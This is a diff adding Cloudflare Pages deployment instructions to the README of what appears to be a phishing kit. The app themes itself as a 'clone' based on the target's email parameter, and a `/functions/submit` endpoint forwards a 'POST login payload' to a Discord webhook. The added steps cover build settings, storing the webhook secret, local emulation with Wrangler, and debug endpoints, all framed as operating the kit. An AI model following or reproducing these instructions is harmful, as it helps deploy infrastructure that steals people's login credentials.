@@ -93,6 +93,45 @@ The application detects the "clone" based on the `email` query parameter. Once t
 
 ---
 
+## ☁️ Deploying on Cloudflare Pages
+
+The repository includes both the static React/Vite frontend and Cloudflare
+Pages Functions which replace the Express server used during development. The
+functions handle webhook submissions to Discord and simple health/debug endpoints.
+
+### Steps to Deploy
+
+1. **Connect Project**: Create a new Cloudflare Pages project and link this
+   GitHub repository.
+2. **Settings**:
+   * Build command: `npm run build`
+   * Build output directory: `dist`
+   * Functions directory: `./functions`
+3. **Environment**: Add a secret named `DISCORD_WEBHOOK_URL` containing your
+   webhook URL.
+4. **Deploy**: Push to the production branch (default `main`) and Pages will
+   build and publish automatically.
+
+### Local Emulation
+
+Install Wrangler locally (`npm install -D @cloudflare/wrangler`) and run:
+
+```bash
+npm run build
+npx wrangler pages dev ./dist --bindings "DISCORD_WEBHOOK_URL=${DISCORD_WEBHOOK_URL}"
+```
+
+Preview the site at `http://localhost:8787`.
+
+### Function Endpoints
+
+* `/functions/submit` – POST login payload; forwards to Discord.
+* `/functions/health` – returns `{ status: 'ok' }`.
+* `/functions/debug` – returns masked webhook URL and runtime info.
+
+The `server.ts` file is retained only for local development; it is not used in
+production on Pages.
+
 ## 🏗️ Project Structure
 
 - `App.tsx`: The logic hub. Parses URL parameters and selects the theme.
